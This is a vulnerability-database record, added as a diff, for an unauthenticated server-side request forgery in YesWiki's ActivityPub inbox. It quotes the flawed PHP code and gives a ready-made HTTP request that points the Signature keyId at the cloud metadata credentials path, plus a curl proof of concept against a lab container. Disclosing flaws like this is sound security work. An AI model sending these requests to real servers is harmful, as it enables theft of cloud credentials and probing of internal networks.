@@ -1,0 +1,146 @@
+[id]
+ave_id = "AVE-2026-0370"
+aliases = ["CVE-2026-52769","GHSA-vw42-752g-5mrp"]
+
+[basic]
+title = "YesWiki has Unauthenticated Server-Side Request Forgery via ActivityPub `Signature.keyId`"
+description = "## Summary
+The `POST /api/forms/{formId}/actor/inbox` route - exposed publicly with `acl:\"public\"` - accepts an HTTP `Signature` header whose `keyId` parameter is a URL. `HttpSignatureService::verifySignature()` parses the header and **immediately makes a server-side HTTP GET** to that URL, **before** any cryptographic verification or URL validation. An unauthenticated remote attacker can therefore make YesWiki issue arbitrary outbound HTTP requests to any host the server can reach - internal services, cloud-metadata endpoints (`169.254.169.254`), intranet-only admin panels, etc. - and read enough back via timing and error-message oracles to scan ports, enumerate services, and (on a real cloud instance) reach IAM metadata.
+
+The only deployment-side precondition is that **ActivityPub be enabled on at least one Bazar form** (`bn_activitypub_enable = '1'`).
+
+## Details
+### Affected component
+
+* **File:** `tools/bazar/services/HttpSignatureService.php`
+* **Method:** `HttpSignatureService::verifySignature(Request $request)`
+* **Sink:** line **96**
+* **Route:** `tools/bazar/controllers/ApiController.php` line **125** — `@Route(\"/api/forms/{formId}/actor/inbox\", methods={\"POST\"}, options={\"acl\":{\"public\"}})`
+
+```php
+// tools/bazar/services/HttpSignatureService.php  (v4.6.5 = origin/doryphore-dev HEAD,
+// lines 83–100)
+public function verifySignature(Request $request) {
+    if (!$request->headers->has('Signature')) {
+        throw new Exception('No signature');
+    }
+
+    $sigConf = parse_ini_string(
+        strtr($request->headers->get('Signature'), [\",\" => \"\n\"])           // (a) attacker controls every field
+    );
+
+    if (!isset($sigConf['keyId'],$sigConf['algorithm'],$sigConf['headers'],$sigConf['signature'])) {
+        throw new Exception('Malformed signature');
+    }
+
+    $response = $this->httpClient->request('GET', $sigConf['keyId'], [    // (b) SINK — no validation,
+        'headers' => [ 'Accept' => 'application/ld+json']                 //     no allowlist, no scheme
+    ]);                                                                  //     pinning, no IP filtering
+    ...
+}
+```
+
+The inbox controller calls `verifySignature()` **before** running any cryptography:
+
+```php
+// tools/bazar/controllers/ApiController.php  (lines 125–145)
+/** @Route(\"/api/forms/{formId}/actor/inbox\", methods={\"POST\"}, options={\"acl\":{\"public\"}}) */
+public function postFormActorInbox($formId, Request $request)
+{
+    $activityPubService   = $this->getService(ActivityPubService::class);
+    $httpSignatureService = $this->getService(HttpSignatureService::class);
+
+    $form = $this->getService(BazarListService::class)->getForms(['idtypeannonce' => $formId])[$formId];
+
+    if ($activityPubService->isEnabled($form)) {
+        $activity = json_decode($request->getContent(), true);
+
+        $httpSignatureService->verifySignature($request);     // <-- SSRF fires here
+        $activityPubService->processActivity($activity, $form);
+        return new ApiResponse(null, Response::HTTP_OK, …);
+    } else {
+        throw new NotFoundHttpException();
+    }
+}
+```
+
+The flow is **public ACL → enabled-form gate → unconditional outbound HTTP**. The attacker controls only the `keyId` value and never has to produce a valid signature, because the outbound fetch is the very first thing that touches the network.
+
+### End-to-end attack chain
+
+A single HTTP request, no session, no CSRF token, no captcha:
+
+```http
+POST /?api/forms/1/actor/inbox HTTP/1.1
+Host: target.example
+Content-Type: application/activity+json
+Signature: keyId=\"http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>\",algorithm=\"rsa-sha256\",headers=\"x\",signature=\"y\"
+
+{}
+```
+
+* The Symfony controller matches the route on `formId=1`.
+* `ActivityPubService::isEnabled($form)` returns true (set when the operator turned the feature on).
+* `verifySignature()` parses the header into a key-value array, finds `keyId`, and calls `httpClient->request('GET', '<attacker URL>')`.
+* YesWiki's server now reaches out to whatever URL the attacker provided. The response body is parsed as JSON; if it doesn't contain `publicKey.publicKeyPem` the controller returns an HTTP 500 whose JSON body **leaks the full exception message and stack trace**, including the URL.
+
+## PoC
+### Pre Reqs
+
+* Yeswiki v4.6.5 lab image (Setup via podman)
+* ActivityPub enabled on the target form
+
+For the rest of this document:
+
+```bash
+BASE=\"http://localhost:8085\"
+CTR=\"yeswiki-poc\"
+```
+
+Before we start, make sure ActivityPub is enabled on the target form
+
+```bash
+podman exec \"$CTR\" mysql -uroot yeswiki -e \
+    \"SELECT bn_id_nature AS id, bn_label_nature AS form, bn_activitypub_enable AS ap
+     FROM yeswiki_nature WHERE bn_id_nature = 1;\"
+```
+
+Send the unauthenticated SSRF trigger:
+
+```bash
+TARGET=\"http://127.0.0.1:9999/aws-metadata?from=ssrf\"
+
+curl -s -X POST \"${BASE}/?api/forms/1/actor/inbox\" \
+     -H \"Content-Type: application/activity+json\" \
+     -H \"Signature: keyId=\\"${TARGET}\\",algorithm=\\"rsa-sha256\\",headers=\\"x\\",signature=\\"y\\"\" \
+     -d '{}' \
+     -w '\n  HTTP %{http_code}, elapsed=%{time_total}s\n'
+```
+
+You will get an error in response like this: 
+```json
+{\"exceptionMessage\":\"Exception: Missing public key in /var/www/html/tools/bazar/services/HttpSignatureService.php:103\nStack trace:…\"}
+  HTTP 500, elapsed=0.15s
+```
+
+The `500` and the `\"Missing public key\"` exception are the **signal** the outbound fetch went all the way to the JSON parse — the listener returned `{}`, which contained no `publicKey` field, so the handler bailed *after* talking to the listener.
+
+Tested with webhook:
+<img width=\"1473\" height=\"678\" alt=\"image\" src=\"https://github.com/user-attachments/assets/6c720c68-3087-4e1a-b990-0a9f12ba8bbc\" />"
+severity = "HIGH"
+score = 5
+sources = ["ghsa"]
+published = ""
+updated = ""
+remediation = "请参考官方安全公告，及时安装安全更新或升级到最新版本。"
+
+[references]
+urls = []
+
+[exploit]
+poc_urls = []
+exp_urls = []
+
+[meta]
+status = "completed"
+collected_at = "2026-07-23T19:24:27.988958407+00:00"
